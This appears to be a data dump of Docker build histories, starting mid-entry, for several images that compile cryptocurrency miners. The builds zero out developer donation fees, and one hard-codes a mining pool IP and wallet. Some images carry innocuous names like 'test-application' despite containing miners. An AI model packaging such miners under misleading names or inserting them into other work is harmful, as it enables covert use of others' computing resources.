/var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=final\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"107.175.17.140:5555",/\'         -e "s/^("wallet_address" : ).*,/\\1"VMHAUS-\xe6\xb4\x9b\xe6\x9d\x89\xe7\x9f\xb601",/"         -e \'s/^("pool_password" : ).*,/\\1"",/\' \t-e \'s/^("nicehash_nonce" : ).*,/\\1true,/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
ellipse12well/fnix; b'ADD file:c02de920036d851cccaedd7f9ed93d48c960ada8e7e839bd2e79ab7b0d7a12d6 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /tmp\nCOPY file:034f295dba193b4cc4f871eec1ab431c4ba99beffb51bf5edca83af61d4f5e7d /tmp\nRUN apt-get update     && apt-get -y --no-install-recommends install ca-certificates curl build-essential cmake libuv1-dev git openssl libssl-dev\nRUN git clone https://github.com/xmrig/xmrig.git     && git -C xmrig apply ../donate-level.patch     && cd xmrig     && mkdir build     && cd build     && cmake -DWITH_HTTPD=OFF ..     && make     && cd ../..     && mv xmrig/build/xmrig /usr/local/bin/xmrig     && chmod a+x /usr/local/bin/xmrig     && apt-get -y remove ca-certificates curl build-essential cmake     && apt-get clean autoclean     && rm -rf /var/lib/{apt,dpkg,cache,log}\nRUN groupadd -g 2000 xmrig &&     useradd -u 2000 -g xmrig -m -s /bin/bash xmrig &&     echo \'xmrig:xmrig\' | chpasswd\nUSER xmrig\nENTRYPOINT ["xmrig"]\nCMD ["--help"]'
occamy/test-application; b'ADD file:5ed435208da6621b45db657dd6549ee132cde58c4b6763920030794c2f31fbc0 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.3.0-1.5.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake .. -DHWLOC_ENABLE=OFF    && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nEXPOSE 3000/tcp\nADD file:f841a0f5a5e68aa580a0f2e8ef2f21248c5d983b2c638f3d173b79a9b6331277 /usr/local/etc/config.txt\nRUN adduser --disabled-login --gecos \'xmrstakcpu\' xmrstakcpu\nUSER xmrstakcpu\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
yanif/cpu-opt; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /root/\nRUN apt-get update && apt-get -qy install  automake  build-essential  libcurl4-openssl-dev  libssl-dev  git  ca-certificates  libjansson-dev libgmp-dev g++ --no-install-recommends\nRUN git clone --recursive https://github.com/JayDDee/cpuminer-opt cpuminer-multi\nWORKDIR /root/cpuminer-multi\nRUN ./autogen.sh\nRUN CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl --disable-aes-ni\nRUN make'
